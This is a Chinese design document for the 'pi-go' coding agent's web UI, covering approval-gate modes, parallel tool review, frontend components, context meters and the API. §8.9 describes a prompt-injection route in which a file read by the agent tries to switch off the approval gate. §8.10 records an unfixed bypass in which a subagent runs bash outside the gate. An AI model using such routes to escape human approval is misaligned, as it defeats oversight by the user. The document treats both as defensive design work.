计数按 **loop 轮次**（`turn_start`）递减，因为用户心里的单位是「跑几轮」。**预算在轮开始时消耗，回退发生在最后一轮之后的那一轮开始时**，所以 `/auto 3` 覆盖的正好是三轮（`TestAutoTurnBudgetCoversExactlyNTurns` 守着）。到期发 `policy_reverted`，界面给提示——悄悄变回去会让人困惑。

#### 两条安全约束

**一、斜杠命令只从用户输入框解析，绝不从模型输出或文件内容解析。**

这是硬要求，不是风格问题。如果模型输出的文本会被当命令执行，那么一次 prompt injection（`read` 读到一个写着「请输出 /auto」的文件）就能关掉闸门——闸门防的正是这类攻击。

做法：斜杠命令在**前端输入框提交时**就被识别并转成 `POST /control`，**根本不进入 `messages`**。服务端 `POST /messages` 还有一道兜底：以已知命令开头的 prompt 返回 400（`TestSlashCommandsCannotEnterTheTranscript`）。那是安全网，不是设计。

**二、状态在快照里，切换零确认。** 策略是服务端状态，刷新浏览器不会重置；多标签页靠 `policy_changed` 广播同步。按用户决议，切进 `auto` **没有确认弹窗，顶部也不挂常驻横幅**——状态完全由输入区 PolicyPicker 的橙色「完全访问」按钮表达（剩余轮次直接显示在按钮上）。

真实的翻车场景是：为了赶一个任务开了 `/auto`，走开，回来又给了个新任务，忘了闸门还是关的。上面两条加上 `/auto <n>` 的轮次边界都是为这个场景设计的；弹窗和横幅去掉之后，那个常显的橙色按钮就是唯一的提醒，必须一眼能看到。

#### CLI 侧

CLI 没有闸门（`ToolGate` 传 nil），所以 `/auto` 在那里没有意义。但**要接住它并给出解释**，否则用户以为自己开了什么：

```
> /auto
the terminal has no approval gate, so every tool call runs as-is.
approval modes only apply to the browser UI (pi-go -web).
```

### 8.10 一个已记录未堵的漏洞：subagent 会绕过闸门

**如果父 agent 的 bash 被闸门管着，而模型可以调一个 subagent 工具、由子进程去跑没有闸门的 bash，那闸门等于不存在。**

subagent 还没实现。三个可选的堵法，实现时必须选一个：

1. subagent 工具本身受闸门管，且**子进程的工具集受限**（不给 bash）
2. 子进程的闸门通过 stdio 代理回父进程的闸门（子 agent 要跑 bash 时，父界面上弹卡）
3. subagent 只在 `auto` 模式下可用（此时闸门本来就是关的，不存在被绕过的问题）

---

## 9. 闸门 × 并行的接缝

并行策略本身见 `harness-design.md` §5（`read`/`write`/`edit` 并行 + per-path 锁，**`bash` 串行**）。这里只讲两个特性的交界：

接缝的形状是**审批串行、执行并行**：并行的 N 个受管调用依次弹卡，全部批准后再并行跑。界面上永远只有一张卡，不用设计卡片堆叠。

它由**两层**共同保证，分工要说清楚：

- `agent/loop.go` 的 `review()` 在派发之前把整批逐个审完，这一层给出的是**顺序**：卡按 `tool_use` 的顺序出现。
- `WebGate.serial` 那把 mutex 保证**同时只有一张**，对任何非循环的调用方也成立（`TestGateSerialisesConcurrentReviews` 并发调 `Review` 四次并断言 `pending_gates` 恒为 1）。

> 这一段原来写的是「顺序 = `tool_use` 顺序，确定性的」，而在 loop 那层做之前**这句话是错的**：mutex 交给先抢到的 goroutine，实测三个调用的审查顺序会是 `call2 call0 call1`。现在它成立了，但成立的原因在 loop 里，不在这把锁里。

**一个客户端必须知道的后果：不能预先批准一整批。** g2 在 g1 被解决之前不存在，所以「全部批准」只能做成随到随答。一口气 POST 三个 `gate_decide` 的脚本，后两个会因为对象还不存在而被静默忽略，然后各自等满超时。

代价是 N 个调用各有自己的超时窗口，最坏情况一批花 N × `-gate-timeout`。对人是对的（一次只问一个问题），对脚本化的超时预算要按 N 算。

由于 `bash` 默认串行，实践中同时需要审批的情况本来就很少——两个默认值互相配合。顺序批次**刻意**逐个 review-then-run，而不是先审完再跑：看过第一条命令的结果再批准第二条，比闭着眼批准两条好。

**对 CLI 渲染器的连带影响**：并行后 `tool_start` / `tool_end` 会交错，原来「一次调用 = 相邻两行」的配对断了。解决办法是本批只要并行过就在结果行前加工具名，且标签在整批期间保持（只在 `inFlight > 1` 时加会让最后一行丢标签）。

**Web 端不需要处理交错**：事件带 `call_id`，前端按 id 归位。这正是「`call_id` 作为一等标识」的价值。

---

## 10. 前端

### 10.1 目录结构

```
web/ui/                                       2955 行
  package.json / vite.config.ts / tsconfig.json
  src/api/types.ts              照 web/wire.go 抄的类型（它是事实来源）
  src/api/client.ts             token 处理 + REST + 控制通道
  src/agent/sse.ts              帧解析（纯函数，零依赖，可离线单测）
  src/agent/useAgentStream.ts ★ SSE 连接、事件折叠、断线重连
  src/agent/timeline.ts       ★ 纯函数：messages + results + live → 时间线
  src/agent/*.test.ts           23 个用例（含真实 SSE 录制回放）
  src/components/highlight.test.ts  13 个用例
  src/views/AgentView.vue       外壳：会话侧栏 + 顶栏 + 时间线 + 输入框 + /skill: 补全
  src/components/
    TurnCard.vue                一轮：思考折叠 + 工具调用序列 + 回答
    ToolCall.vue                分派器：按 name 路由到五个渲染器
    tools/{Read,Ls,Write,Edit,Bash}Result.vue
    SkillBlock.vue              /skill: 展开后的 <skill> 块，默认折叠
    DiffView.vue              ★ 统一 diff 渲染
    GateCard.vue              ★ 审批卡
    CodeBlock.vue               行号 + 折叠 + 复制 + 语法着色
    highlight.ts              ★ 手写 tokenizer（纯函数，见 §10.9）
    ContextMeter.vue            上下文占用预警（§10.8）
    ModelPicker.vue             原生 select，未配置 key 的模型不可选
```

`useAgentStream` 是服务端 `hub.apply()` 的**客户端镜像**：同一个状态机、同样的顺序，所以快照和实时流不会给出不同结果。

### 10.2 数据模型：镜像 pi-go 的 `llm.Block`

```ts
type Block =
  | { type: "text";     text: string }
  | { type: "thinking"; text: string }
  | { type: "tool_use"; id: string; name: ToolName; input?: unknown }

interface Message { id: string; role: "user" | "assistant"; content: Block[] }
```

**`tool_result` 和 `details` 在发给浏览器的结构里不在消息上**，按 `call_id` 存边表（§7.3）。好处是 `-resume` 的历史回放和实时渲染共用一套结构，会话文件是唯一事实来源。

注意这只是**给浏览器的形状**。在会话文件里 details 是挂在 tool_result block 上的（`llm.Block.Details`），`Hub.Seed()` 读回来时才把它抽进边表 —— 这就是刷新之后 diff 还在的原因。

`buildTimeline(messages, results, live)` 是纯函数（无 Vue 依赖），返回扁平的 `UserItem | TurnItem` 列表，`TurnItem.calls` 里每个调用挂着自己的 result / 运行态 / 闸门 / 孤儿标记。**没有递归树**：pi-go 只有两层。

### 10.3 loop 可视化

pi-go 的形状是**扁平的轮次序列**，不是阶段/波次：

```
▸ 你：把 config.go 的超时从 30s 改成 60s

  ┌ 第 1 轮 ────────────────────────────────┐
  │ ▸ 思考  需要先看看这个文件                │
  │ ● read  config.go                        │
  └──────────────────────────────────────────┘
  ┌ 第 2 轮 ────────────────────────────────┐
  │ ● edit  config.go            ← DiffView  │
  │ ● bash  go build ./...       exit 0 1.2s │
  └──────────────────────────────────────────┘
  ┌ 第 3 轮 ────────────────────────────────┐
  │ 已把 config.go 的超时改成 60s，编译通过。  │
  └──────────────────────────────────────────┘
                          [in 4026 · cached 3328 · out 257]
```

`turn_start` 就是划分依据，轮次编号在每次新提问时归零。**并行工具调用**在同一轮内并列展示——同一轮内的调用天然就是同一批，不需要 YX 的波次逻辑。

**右缘的轮次定位条**（仿 YX agent-qa）：每条用户提问一个点，轨道填充是滚动进度，放大点是视口所在位置，悬停预览问题（skill 调用只显示调用行，不展开指令全文），点击平滑跳转。位置是从渲染出的 `.ask` 元素**量出来的**，不是按消息数估的——一轮的高度由工具结果决定，估算必然错。内容高度不超出视口 1.2 倍时整条不出现：短对话不需要地图。

**用户提问是右对齐的浅灰圆角气泡（纯黑字）**（仿 ChatGPT 的用户气泡），发送时间在气泡**上方居中**一行（仿微信/iMessage，「YYYY年M月D日 HH:mm」），下方一行只留悬停才露出的复制/编辑小图标；编辑只是把原文回填输入框并聚焦，不自动重发——不替用户做决定。时间戳来自 record 的写入时间：`session.Store.TimedMessages` 替代 `Messages` 喂给 `Hub.Seed`，wire `Message` 多了 `ts` 字段；skill 调用保持宽卡片不入泡。等待反馈：`busy` 但还没有任何新内容（没有 text/thinking、没有 pending 工具/闸门）时，时间线尾部显示三点弹跳动画 +「等待模型响应…」——对应 TUI 里 turn 开始到首个 delta 之间的 spinner。

回答正文的 markdown 表格有边框（markdown-it 默认就会渲染 GFM 表格，但 UA 样式表不给它画线，不补样式就只是一堆对齐文本）：`border-collapse` 细线框 + 表头浅灰底；超宽表格（`display:block; max-width:100%`）横向滚动而不是撑破栏宽。

### 10.4 工具结果的渲染

| 工具 | 呈现 |
|---|---|
| `read` | 文件名 + 行范围；内容走 `CodeBlock`（行号起点取自 `details.first_line`，按扩展名着色，见 §10.9）；被截断时给「继续读第 N 行往后」按钮，点击后**填充输入框**而不是自动发送——不替用户做决定。命中 SKILL.md 时在调用行上打一个 `skill <name>` 徽标（见 §10.11） |
| `ls` | 多列名字网格，目录**固定天蓝色**（`#0ea5e9`，不走 `--el-color-primary`——主色按决议是黑的，但目录要的是终端 ls 的那种蓝）；条目数上限触发时给「列出更多」按钮。类型信息从名字尾部的 `/` 读回，不额外要一份服务端结构 |
| `find` / `grep` | 共用 `SearchResult.vue`。find 是分栏路径列表；grep 全宽、路径 + 行号 + 匹配行。头部一行元信息：结果数、涉及文件数、**扫描项数**、跳过的二进制数、是否截断。**搜不到不是空状态**，显示「没有匹配 `pattern`」并保留扫描项数 —— 那个数字才说明是「不存在」还是「找错了地方」。行同样从文本里解析回来（grep 只在**前两个**冒号处切分，因为匹配行本身可能含冒号） |
| `write` | 新建/覆盖徽标 + 字节数；**覆盖时显示 diff** |
| `edit` | **主角。`DiffView` 渲染 `details.diff`**，超过 28 行折叠 |
| `todo` | 勾选清单（记号而非状态词），头部一行「n/m + 进行中的那一项」。**被后续写入取代的那些收成一行并降透明度**——见 §10.12，这是唯一一个「只有最新那条算数」的结果 |
| `bash` | 终端样式（等宽 + 深底，**不做语法着色**：输出不是代码；但命令自己打印的 ANSI SGR 颜色经 `ansi.ts` 解析成内联样式渲染——`AnsiText.vue`，settled 的 `CodeBlock terminal` 与运行中 live 输出同一份组件；光标移动/擦除/OSC 类转义一律丢弃，token 仍是文本节点，无注入面）。**`ls -l` 长列表行有兜底补色**（`colorizeLongListing`）：管道里的 ls 什么颜色都不打印（实测 macOS BSD ls 下 `CLICOLOR_FORCE`/`-G` 均无效），渲染侧认出权限串行后自己给名字列上色——目录天蓝、软链青、可执行绿，已带 SGR 的行不碰。`exit code`（非 0 红色）+ 耗时；`truncated` 时提示完整输出的临时文件路径。**运行中直接在调用行下面渲染实时输出**（`tool_partial` 折进 `PendingTool.Output`），`tool_end` 之后被 settled 结果取代，所以同一份输出不会画两次；跟随滚动，但用户往上翻之后不再抢回底部 |

**diff 不在 JS 里重算。** `details.diff` 是 Go 侧渲染好的（行号、上下文折叠都有），前端只按前缀上色；`details.patch` 是给 `git apply` 的那份。两个 diff 实现迟早会不一致。

### 10.5 错误自纠正：pi-go 的签名行为

工具失败不中断 loop，错误文本回传给模型，模型自己纠正。UI 把这条因果链画出来，而不是显示成两次无关的失败调用：

```
┌ 第 1 轮 ──────────────────────────────────────────────┐
│ ● edit  dup.txt                               ✕ 失败  │
│    ⚠ oldText matches 2 places. Add surrounding context│
└───────────────────────────────────────────────────────┘
        ↳ 看起来是在纠正前面那次失败的调用
┌ 第 2 轮 ──────────────────────────────────────────────┐
│ ● read  dup.txt                                       │
│ ● edit  dup.txt                               ✓ 成功  │
└───────────────────────────────────────────────────────┘
```

判定规则（`linkCorrections`）：同工具 + 同目标（`path`，bash 用 `command`）+ 更晚 + 前者失败。**这是启发式，所以做成一行虚线小字的弱提示**，不画箭头也不断言因果。

### 10.6 性能

| 问题 | 对策 |
|---|---|
| 每 token 重跑 `md.render` | **流式期间渲染纯文本**，`message` 定稿后才跑一次 markdown |
| 每 token 重建 timeline | `liveVersion` 最多每 **80ms** 自增一次，`buildTimeline` memo 在它上面。打字效果保留，时间线不会每 token 重建 |
| bash 输出几千行 | `CodeBlock` 超过 8 行折叠（132/460px），`DiffView` 超过 28 行折叠 |
| 滚动跟随抢夺控制权 | `stickToBottom`：`scroll` 事件里判断距底 > 80px 则置 false，回到底部恢复。**只在 true 时自动滚** |
| 定位条每 token 重算位置 | rAF 合帧；新消息由 `timeline.length` 触发，其余高度变化（流式追加、卡片折叠、窗口缩放）由内层容器的 ResizeObserver 兜底 |

### 10.7 顶栏与输入区

侧栏左上角是 logo + 文字标（`Logo.vue`：黑色圆角方块上的白色 π，纯 path 绘制、不依赖任何字体，收起到哪都渲染一致）；收起态图标栏顶部也保留 logo。同一份图案也是 favicon（`public/logo.svg` + `logo.png`，svg 给现代浏览器，png 兜底和 apple-touch-icon）。

**整套 UI 是黑白配色**：`styles.scss` 把 Element 的 `--el-color-primary` 整条梯度覆写成灰阶（#1a1a1a 起），所有吃 primary 的地方——会话选中条、focus 环、live 圆点、对勾、链接——一次全部转黑白；发送按钮（可发送时）再单独定死为 `#000` 纯黑底白字，是页面上对比最强的一个动作。语义色（warning/danger/success）保留不动，因为它们承载含义而不是装饰。代码高亮和 diff 的配色同理保留。

侧栏可收起（仿 Gemini）：展开态悬停侧栏时「新会话」旁露出收起按钮；收起态是一条 56px 图标栏，只留「展开」和「新会话」两个图标。状态存 localStorage。

会话项的操作收进悬停露出的 ⋮ 菜单（仿 Gemini）：置顶 / 重命名 / 删除。置顶与改名走 `PATCH /api/sessions/{id}`，以**追加 meta 记录**的方式落盘（`Meta.Pinned/Title` 是指针，合并取最后非 nil；创建记录永不改写，transcript 保持 append-only），`List` 排序置顶在前。删除仍是 409 防运行中误删 + 二次确认。

顶栏：累计 usage + 工作区文件按钮（文件夹图标，开合右侧文件面板，见 §16）+ 连接状态。

**界面没有任何悬浮弹框**（`ElMessage` 已全部移除）：瞬时反馈（命令输出、操作失败）走顶栏下方一条内联通知条，与重试/断线提示同款样式、几秒自动消退（缺 token 这种致命的常驻）；状态反馈体现在变化的控件本身——复制成功是复制图标变 1.5 秒对勾，切模型/切审批模式看 picker 按钮的新文案。仅存的两个 modal：删除会话确认（会话记录不可恢复）和重命名输入框（它是表单，不是 alert）。

**输入区是一张卡片**：textarea 无边框在卡片内，下方一行工具栏——`ModelPicker` + `ContextMeter` + `PolicyPicker` 居左，「停止/发送」居右，卡片整体 `:focus-within` 高亮（布局仿 YX agent-qa 的输入卡）。模型、上下文、审批模式之所以放这里而不是顶栏：「用哪个模型、还剩多少上下文、要不要逐条批准」都是在发送前一刻做的决定，控件就该在发送按钮旁边。

`PolicyPicker` 是审批门三模式（strict/standard/auto）的切换器，菜单仿 ChatGPT 的审批弹层：顶部一行标题，每个选项「图标 + 中文名 + 一行说明」（请求批准 / 替我审批 / 完全访问），选中项右侧对勾；只有 auto（完全访问）用橙色——警示跟着语义走，不跟选中态走。切进 auto 没有确认弹窗（用户决议：状态由按钮自身表达，见 §8.9）。斜杠命令 `/auto` `/strict` `/standard` 依旧可用。

`ModelPicker` 是**按钮 + popover 列表**（同样仿 YX）：按钮只显示当前模型 id，provider、上下文窗口、「需要 key」提示放在列表行里，当前行带对勾。未配置 key 的模型**列出但不可选**——隐藏它会让人以为模型没了。运行中禁用（服务端也会返 409，因为 `SetClient` 写的字段被 loop 每轮读）。切换保留历史。

输入行为：多行输入（Enter 发送，Shift+Enter 换行）、运行中显示「停止」按钮（走 `POST /control`，不是 abort）、`run.active` 时禁用发送。斜杠命令在提交时识别并转成 control 调用。

删除会话有二次确认（会话记录不可恢复），运行中删除返回 409。

### 10.8 上下文占用预警

YX 的 `ContextPanel`（1253 行）做的是「上下文构成可视化 + 手动压缩」，全屏弹窗 + 饼图/柱状图切换 + 二级弹窗明细，同一信息出现三次，而且没有窗口上限做分母。pi-go **没有 compaction，撞上限会直接失败**——所以这里的需求不是压缩，是**预警**：分三层，每层只回答一个问题。

1. **常驻层（还剩多少）**：输入栏里的 `ContextMeter` 按钮——两段式细条（固定开销灰底 + 对话增长按 70%/85% 绿黄红）+ `82K/200K · 41%` 常显，点击展开详情。
2. **详情层（是什么在吃）**：popover 里一条 100% 堆叠条（系统开销/用户消息/助手回复/工具结果/**剩余空间**）+ 图例行，行内展开看 top 5 大条目，不做二级弹窗。剩余空间必须是单独一段——「还能跑多久」是这个可视化的第一性问题。
3. **预警层（现在该干嘛）**：≥85% 时在**输入框上方**出提示条（比顶栏贴近决策点），指向仅有的两个动作：开新会话、切换更大窗口的模型。

**关键是用哪个数。** 直觉会去拿会话累计的 `usage.input`，那是错的：

```
真实录制的四轮对话
  每轮 prompt:  866 → 978 → 1114 → 1199    ← 占用（每轮重发全部历史，所以在长）
  累计 input:   4157                        ← 计费口径（正好是四轮之和）
```

只跑四轮，累计值已经是真实占用的 3.5 倍，而且差距随轮次二次增长——用它做的仪表在一个健康会话上就会爆表。

所以协议上分成两个字段：

| 字段 | 含义 | 来源 |
|---|---|---|
| `snapshot.usage` | 会话累计，**计费口径** | `run_end` 的 `a.usage`（loop 里累加） |
| `snapshot.context_tokens` | **最近一轮的 prompt 大小**，占用口径 | `message` 事件携带的那一轮 `resp.Usage.Input` |
| `snapshot.overhead_tokens` | 固定开销估算（system prompt + 工具 schema），拆分占用用 | 会话创建时 `agent.OverheadTokens()`（`New` 里算好后不再变，所以无锁可读） |

这需要 loop 把**每轮自己的 usage** 也发出来（原来只在 `agent_end` 报累计）。`agent.Event.Usage` 因此在两种事件上含义不同，`event.go` 的注释写明了。`TestContextTokensTrackTheLatestTurnNotTheTotal` 锁住这个区别。

**`Input` 就是完整占用，不用再加 `CacheRead`。** OpenAI 协议里 `prompt_tokens_details.cached_tokens` 是 `prompt_tokens` 的**子集**（实测：`input:978, cache_read:768`）。cached 单独显示只是为了让人看清缓存命中带来的成本差异。这一点与 Anthropic 协议相反（那边 `input_tokens` 不含 cache read），迁移协议时踩过。

**窗口大小随快照下发**（`run.context_window`，来自模型目录），而不是让前端拿 model id 去 `/api/models` 里 join：切模型时 `model_changed` 会带上新窗口（k3 是 1M，glm-5.2 是 200K，实测切换后百分比从 0.11% 重算为 0.60%），目录里没有的模型则不显示仪表而不是显示一个错的。

**构成是估算、总量是实测。** 前端把消息按块类型做字符估算（英文≈4 字符/token，中文≈1.5；thinking 不回放所以不计），得出比例后**归一到 `context_tokens`**——估算只决定各段的相对大小，绝对数字永远是服务端实测。弹层底部写明了这两个口径，免得有人把估算当账单。

### 10.9 语法高亮：手写 tokenizer，输出 token 而不是 HTML

`highlight.ts`（约 250 行，零依赖）。不用 highlight.js / prism，**理由不是体积而是安全**：那类库产出的是 HTML 字符串，必须用 `v-html` 注入；这个产出 `Token[]`，模板按文本节点渲染，所以工具打印出的任何内容都不可能变成标签。coding agent 整天在显示不是自己写的文件内容。

它是 scanner 不是 parser：认识注释、字符串、数字、关键字，遇到别的就当普通文本。**一条不变量让"猜错"永远无害**：

```
tokenize(code, lang).map(t => t.text).join("") === code    // 恒成立
```

猜错只会导致颜色不对，绝不会丢字符或多字符。测试对 **7 种语言 × 9 个样本**（含未闭合字符串、未闭合块注释、空串、纯换行、emoji + 中文）断言这条；实现上每个分支都至少消费一个字符，所以任何输入都不会死循环。另外抽查过项目里 7 个真实文件（Go / TS / Vue / JSON，最大 16KB），零文本丢失，token 分布合理。

几个具体的坑：

- **先整体 tokenize 再按换行切分**（`highlightLines`）。反过来做会破坏跨行结构：Go 的原始字符串和 `/* */` 会被从一个 scanner 从未处于的状态重新扫描
- **非原始字符串不跨行。** 一个落单的引号否则会把文件剩下的部分全部染成字符串
- **未闭合的块注释扫到文件末尾**而不是循环
- 支持 go / ts(js,vue,jsx) / json / shell / yaml，其余走 `plain`。`.vue` 按 ts 扫是近似的（它是 HTML + TS + SCSS 三合一），可接受

两处刻意不着色：

- **bash 的输出**（`terminal` 模式）。输出不是代码，给栈回溯的关键字上色是噪音
- **DiffView**。它已经用背景色表达增删，再叠一层语法色会互相打架；diff 的可读性靠 `+`/`-` 和行号，不靠关键字

配色克制：注释灰斜体、字符串绿、数字蓝、关键字红、类型紫、函数名褐。目的是一眼找到字符串和注释，不是把文件变成彩虹。

### 10.10 构建与分发

```bash
cd web/ui && npm ci && npm run build   # 产物在 dist/
cd ../.. && go build -o pi-go .        # dist 被 embed 进二进制
```

**`web/ui/dist` 进版本库**（`.gitignore` 里有注释说明原因）：它被 `//go:embed all:ui/dist` 引用，checkout 里没有它 `go build` 会直接失败。改完前端不重新 build，二进制里还是旧页面。

`ui.go` 里的 `uiRoot()` 会检查 index.html 是不是那个占位文件；是的话 `/` 返回一个接口清单页而不是坏页面。

开发模式：`pi-go -web -web-dev http://localhost:5173` + 另一个终端 `npm run dev`。浏览器只跟 Go 服务器打交道，非 API 路由被反代给 vite——单一 origin，token 和同源校验照常工作，HMR 也能用（`httputil.ReverseProxy` 支持协议升级）。

### 10.11 skills 在界面上的三处

**一、`/skill:` 补全。** 输入框内容恰好是 `/skill:` 前缀（不含空格和换行）时，下方列出候选，点击填成 `/skill:name `。列表来自 `GET /api/skills`，挂载时取一次——skills 是服务端全局且启动即固定的，没有刷新的必要。

**二、`<skill>` 块折叠卡。** 展开后的 user 消息以 `<skill name= location=>` 开头，`parseSkillBlock()` 把它解析回结构（纯函数，有单测）并渲染成默认折叠的卡片。**用户在命令后面自己打的那段话始终可见**，因为那是请求，skill 只是它的上下文；skill 正文常有几百行，展开着会把问题挤出屏幕。解析时会去掉服务端加的那行 "References are relative to ..." —— 那是给模型的，读者不需要看两遍。

**三、read 上的 skill 徽标。** `matchSkillRead()` 拿 `tool_use.input.path` 与已加载 skill 的路径比对，相对路径按 cwd 解析。数据源是 args 而不是 details，当时的理由是 details 不进 JSONL —— 那个前提**后来被 P3 改掉了**，details 现在也持久化。结论仍然不变，但理由换成了更简单的一条：args 是那次调用本身的一部分，读哪个文件不需要绕道工具的返回值去问。前端的路径归一只是文本处理（`.` / `..`），不跟随符号链接；终端侧的匹配在 Go 里做，那边是权威的。

这一节替代了原计划的 `skill_hit` 事件，理由见 §6.2。

### 10.12 任务清单：唯一一个「只有最新那条算数」的工具结果

`todo` 的结果和其他工具的结果性质不同。`edit` 的 diff 是一件**发生过的事**，永远为真；而一份任务清单是**当时的状态**，被下一次写入取代。所以时间线上 N 个 todo 卡片里只有最后一个是当前计划，其余都是历史快照。

全部一样渲染会主动误导：往上滚看到一张写着「1/3 done」的清单，读起来就是现在的进度。所以 `buildTimeline` 末尾多跑一趟 `markSupersededTodos(items)`，被取代的那些打上 `superseded`，卡片收成一行（可点开——「那一项什么时候出现的」偶尔要查），并整体降透明度。

**为什么是独立的一趟而不是投影时顺手判断**，理由与 `linkCorrections` 完全相同（§10.5）：「这条是不是最新的」是关于整条时间线的事实，边建边判的循环在建完之前不可能知道。

只有**已结束且成功**的写入算作当前计划。两条都是必要的，都有单测，而且都做过变异验证（去掉任一条各有测试变红）：

- 被拒的调用什么都没写成——两个 `in_progress` 的清单从未成为状态——所以它不能把它前面那份好清单降级。
- 没有结果的调用（还在飞、或进程死掉留下的孤儿）同理。让它降级会**在有人正看着的那段时间里**把计划清空。

卡片本身用**记号而不是状态词**：五个拼写出来的状态排在左边距会把每条任务推成一个参差的列，比模型读到的纯编号文本更难扫；而项目的状态恰好是可以一眼看的，文字不是。`in_progress` 是唯一全亮度的一行（它是「现在干什么」的答案），`completed` 划掉并降灰，`blocked` 走警告色——它是完成规则把失败重定向过去的那个状态，没人看的 blocked 项就是一次失败的验证悄悄变成成功的路径。

`ToolName` 因此长到九个，而**后两个是子 agent 永远没有的**：subagent 不能继续往下派，也不记清单。理由不是权限而是没有读者——子活一次 run、10 分钟封顶，碰不到压缩边界；而它的进度早已在父的 subagent 卡片里以更细的粒度显示。

---

## 11. 接口清单

```
GET    /api/models                        模型目录（configured / key_env / subagent_model）
GET    /api/skills                        已加载的 skills（name/description/path/dir/source）
GET    /api/sessions                      会话列表 + cwd + model + skills
POST   /api/sessions                      {model?, workspace?} 新建 → 201 {session_id, path,
                                          model, provider, workspace}；workspace 是服务根下的
                                          相对目录（"" = 根），成为该会话的工作目录（§18.3）
GET    /api/sessions/{sid}                {session_id, snapshot}
PATCH  /api/sessions/{sid}                {title?, pinned?} 重命名 / 置顶
DELETE /api/sessions/{sid}                204；运行中 → 409
POST   /api/sessions/{sid}/messages       {prompt} → 202 {run_id}；已有 run → 409
GET    /api/sessions/{sid}/stream[?from=] SSE
POST   /api/sessions/{sid}/control        cancel / steer（§7.7）/ set_model / set_policy /
                                          gate_decide / gate_freeze / gate_thaw（§8）/
                                          rewind / rewind_preview（§18）
GET    /api/sessions/{sid}/terminal       websocket：会话内的 pty shell（§17）
GET    /api/files?path=                   目录列表：目录优先排序、跳过 .git、500 条截断（§16）
GET    /api/files/content?path=[&raw=1]   文本预览（256KB/5000 行截断，NUL 判二进制只报 mime）；
                                          raw 仅限嗅探为 image/* 的响应且带 nosniff（防同源脚本）
PUT    /api/files/content                 {path, text, base_mtime_ms, force?} 面板内保存：mtime 乐观并发
                                          （漂移 → 409 带 current_mtime_ms）、原子替换保权限位、过 journal、
                                          不过审批闸门（用户本人操作）；二进制/NUL 文本拒绝
GET    /api/files/index                   quick-open 路径索引（跳过 .git/node_modules/dist，2 万条上限）
POST   /api/files/mkdir                   {path} 在工作区下建**一层**目录，给工作区选择器的
                                          「新建文件夹」用；缺父目录是 404，不默默实体化整条路径
GET    /api/workspace/changes             工作区改动列表（A/M/D + ±统计 + sid，来自 file journal，§16 M4）
GET    /api/workspace/diff?path=          对首次改动前基线的累积 unified patch（超 2MB/5000 行只给统计）
POST   /api/workspace/journal/clear       清空基线（diff 从此刻重新累积）
```

`/api/files*` 三个端点的 `path` 全部过 `tools.Resolve`——和 agent 自己的工具是**同一套** canonical 逃逸检查，浏览器不会比模型看得更远。

快照的字段树（`wire.go` 的 `Snapshot` 是事实来源）。写在这里是因为 curl 的人手上没有 `types.ts` 那份对照，而**待决闸门在 `live` 里、不在顶层**这一点踩过一次：按顶层取会永远读到空，看起来就像闸门没生效。

```
{ session_id, snapshot: {
    seq, messages[], results{call_id: {...}},
    run:    { run_id, active, model, provider, context_window, ... },
    live:   { run_id, active, text, thinking,
              pending_tools[],           ← 已开始未结束的调用
              pending_gates[] },         ← 待人批准的调用（不在顶层！）
    policy: { mode, remaining_turns },
    usage:  { input, output, cache_read, reasoning },   ← 累计，计费口径
    context_tokens,                 ← 最近一轮 prompt，占用口径
    overhead_tokens                 ← 固定开销估算（system prompt + 工具 schema）
} }
```

`messages` 与 `stream` **分开**是有意的：发起和订阅解耦，才能做到「发起的那个连接死了，run 照样活着」。这也是与 YX 的 `POST /agent/query` 直接返回 SSE 流最大的结构差异——那种结构下发起连接就是唯一连接，断了就没了。

列表项里的 `skills` 是会话**创建时**记录的那一组，不是服务器当前加载的那一组。两者不同就说明这个会话不再可复现 —— 界面上还没有用到这个字段。它曾经在 Go 侧只写不读，那段历史与修法见 `harness-design.md` §8「resume 时的元数据」。

**损坏的会话文件**：`session.Open` 的诊断目前只打到**服务端控制台**，浏览器没有展示位置。CLI 那条路径会打到 stderr。见 `harness-design.md` §8「损坏恢复」。

**没有 `-p` 的 Web 等价物**（不做「提交任务 → 拿 run_id → 轮询」那套）。

---

## 12. `-p` 与 subagent 的关系

`-p` 不做 Web 化，它要留给 subagent。三条约束：

**子进程不能有闸门。** subagent 跑起来时没有人在看，`Review` 会阻塞到超时然后拒绝。所以 CLI 路径的 `ToolGate` 必须是 `nil`（也就是现在的行为）。这同时保证 `-p` 继续可脚本化。

**父子之间靠 stdout 通信。** `-p` 现在往 stdout 打人类可读的渲染结果。做 subagent 时父进程要的是结构化结果，需要加一个 `-format json` 输出 JSON 事件流（复用 §6.2 的 wire 格式，换 JSONL 承载）。那会是第四个事件消费者——又一次印证事件流设计的价值。

**§8.10 的绕过漏洞必须堵一个方案。**

---

## 13. 决议记录

| # | 问题 | 决议 |
|---|---|---|
| 1 | 审批闸门是否进 v1 | **做，且做全**。含改写路径、超时冻结/恢复、跨重连恢复 |
| 1b | 全自动模式 | **`/auto` 斜杠命令**，模式名与命令同名（原 `yolo` 已改名）。推荐 `/auto <n>` 限轮次 |
| 2 | 前端仓库位置 | **单仓 + `embed` 单文件分发**。`web/ui/` 放源码，产物打进二进制 |
| 3 | `Tool` 接口改动碰 loop | **接受** |
| 4 | 并行工具调用 | **做**：read/write/edit 并行 + per-path 锁，**bash 默认串行** |
| 4b | 用 `errgroup` 吗 | **不用**（推翻）。见 `harness-design.md` 决议 4b |
| 5 | `-p` 的 Web 等价物 | **不做** |
| 6 | run 的寿命 | **属于 session，不属于 HTTP 连接**（与 YX 相反）。因此僵尸问题自己兜（§7.5） |
| 7 | 快照是否重放增量 | **不重放**。只给当前状态，日志只存语义事件 |
| 8 | 审批超时的默认动作 | **拒绝**（fail closed），且拒绝只是给模型的信息 |
| 9 | token 的强制范围 | **永远必需，但只覆盖 `/api/*`**（收紧了「绑 0.0.0.0 才强制」，放开了静态资源） |
| 10 | gate 事件的顺序问题 | **前端容错**，不动服务端并发代码（§6.3） |
| 11 | 会话落盘粒度 | **per-run**，因为运行中读 `agent.Messages()` 是 data race |
| 12 | bash 命令白名单 | **不做**。前缀匹配不是安全边界，白名单只制造虚假安全感（§8.4） |

---

## 14. 雷区清单

### 前端

1. **静态资源不能要 token**（§8.1）。往严格改一次就白屏。
2. **快照不重放 `run_end`**。任何「等运行结束」的逻辑必须同时接受 `snapshot.run.active == false`。
3. **`gate_request` 可能先于它引用的 `message` 到达**（§6.3）。`timeline.ts` 的 `adoptOrphanGates` 兜住这条，别删。
4. **不要在 JS 里重新算 diff**（§10.4）。
5. **斜杠命令在输入框提交时就转成 `POST /control`，绝不进 `messages`**（§8.9）。
6. **markdown 只在消息定稿后渲染一次**，流式期间渲染纯文本。
7. **UI 折叠态别塞进数据模型。** 展开/折叠留在组件里——YX 把它们混进了持久化的 `Turn`，回放时得连 UI 态一起还原。
